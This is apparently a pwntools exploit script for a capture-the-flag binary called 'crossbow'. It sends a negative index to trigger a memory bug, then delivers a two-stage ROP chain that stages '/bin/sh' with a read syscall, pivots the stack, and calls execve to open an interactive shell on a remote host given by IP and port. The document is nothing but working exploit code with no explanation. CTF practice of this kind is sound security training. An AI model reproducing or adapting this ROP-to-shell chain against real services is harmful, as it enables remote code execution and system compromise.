from pwn import *

context.binary = binary = ELF('./crossbow',checksec=False)

r = ROP(binary)
POP_RDI = r.find_gadget(['pop rdi','ret'])[0]
POP_RSI = r.find_gadget(['pop rsi','ret'])[0]
POP_RDX = r.find_gadget(['pop rdx','ret'])[0]
POP_RAX = r.find_gadget(['pop rax','ret'])[0]
POP_RSP = r.find_gadget(['pop rsp','ret'])[0]
SYSCALL = r.find_gadget(['syscall','ret'])[0]

buf = p64(0)
buf += p64(POP_RDI)
buf += p64(0)
buf += p64(POP_RSI)
buf += p64(0x40da00)
buf += p64(POP_RDX)
buf += p64(0x50)
buf += p64(POP_RAX)
buf += p64(0)
buf += p64(SYSCALL)
buf += p64(POP_RSP)
buf += p64(0x40da08)

buf2 = b'/bin/sh\x00'
buf2 += p64(POP_RDI)
buf2 += p64(0x40da00)
buf2 += p64(POP_RSI)
buf2 += p64(0)
buf2 += p64(POP_RDX)
buf2 += p64(0)
buf2 += p64(POP_RAX)
buf2 += p64(59)
buf2 += p64(SYSCALL)

p = remote('83.136.254.165',54404)

p.sendline(b'-2')
p.sendline(buf)
p.send(buf2)

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
